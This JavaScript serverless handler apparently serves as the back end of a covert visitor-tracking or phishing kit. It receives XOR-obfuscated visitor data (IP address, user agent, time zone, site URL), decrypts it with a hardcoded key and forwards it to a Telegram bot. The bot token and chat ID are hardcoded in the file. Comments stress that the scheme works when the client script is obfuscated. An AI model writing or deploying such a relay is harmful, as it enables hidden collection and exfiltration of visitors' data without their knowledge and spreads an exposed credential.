// ✅ FIXED: Robust decryption that works even if client code is obfuscated

const SECRET_KEY = "MyS3cr3tK3y@2026!UPtmagiPaylodU0PC1n7";

// ✅ Fixed base64 decode - works in Node.js
function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('binary');
}

// ✅ Fixed XOR decryption
function xorDecrypt(encrypted, key) {
    let result = '';
    for (let i = 0; i < encrypted.length; i++) {
        result += String.fromCharCode(
            encrypted.charCodeAt(i) ^ key.charCodeAt(i % key.length)
        );
    }
    return result;
}

// ✅ Main decryption with error handling
function decryptData(encryptedBase64) {
    try {
        const base64Decoded = base64Decode(encryptedBase64);
        const decrypted = xorDecrypt(base64Decoded, SECRET_KEY);
        return JSON.parse(decrypted);
    } catch (error) {
        throw new Error('Decryption failed: ' + error.message);
    }
}

// ✅ Telegram sender
async function sendToTelegram(message) {
    const BOT_TOKEN = '8075489868:AAHZzQI9EO6gExTKCMqVpBPUuEjfTC0ZtqM';
    const CHAT_ID = '1641664147';
    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML' // ✅ Added for better formatting
        })
    });
    
    if (!response.ok) {
        throw new Error(`Telegram API error: ${response.status}`);
    }
    
    return true;
}

// ✅ Main handler
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { heyman } = req.body;
        
        if (!heyman) {
            return res.status(400).json({ error: 'Missing encrypted data' });
        }

        // ✅ Decrypt data
        const data = decryptData(heyman);
        
        // ✅ Extract and validate fields
        const ip = data.visitorIp || 'Unknown';
        const ua = data.userAgent || 'Unknown';
        const date = data.date || 'Unknown';
        const time = data.time || 'Unknown';
        const tz = data.timeZone || 'Unknown';
        const website = data.website || 'Unknown';

        // ✅ Format message with HTML
        const message = 
            '<b>🚀 New Visitor Alert 🚀</b>\n\n' +
            `<b>🌐 IP:</b> <code>${ip}</code>\n\n` +
            `<b>🖥️ User Agent:</b> <code>${ua}</code>\n\n` +
            `<b>📅 Date:</b> ${date}\n\n` +
            `<b>🕒 Time:</b> ${time} (${tz})\n\n` +
            `<b>🔗 Website:</b> <a href="${website}">${website}</a>`;

        // ✅ Send to Telegram
        await sendToTelegram(message);

        return res.status(200).json({ success: true });
        
    } catch (error) {
        console.error('Server error:', error); // ✅ Log for debugging
        return res.status(500).json({ 
            error: 'Server error',
            message: error.message 
        });
    }
}